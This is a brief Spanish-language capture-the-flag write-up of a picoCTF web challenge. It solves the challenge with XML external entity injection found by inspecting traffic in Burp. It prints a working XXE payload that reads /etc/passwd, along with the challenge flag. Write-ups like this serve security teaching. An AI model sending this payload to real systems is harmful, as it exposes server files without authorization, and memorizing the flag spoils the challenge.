# Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:59804/)
Hints:
1. XML external entity Injection
# Solución
- Abrimos la página del link que nos da
- Si inspeccionamos el código no podremos encontrar nada, así que lo analizamos con BURP
- Vemos lo que sucede en el historial HTTP
- Podemos ver que se envía un XML en los 3 escenarios
- Vemos que existe una vulnerabilidad para el procesamiento del XML
- Inyectamos una identidad externa y de esta forma obtenemos la bandera
- El XML que se envía quedaría así
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data><ID>&xxe;</ID></data>
```

```
picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
```
# Notas adicionales
# Referencias
- https://www.youtube.com/watch?v=b1pGlutUL34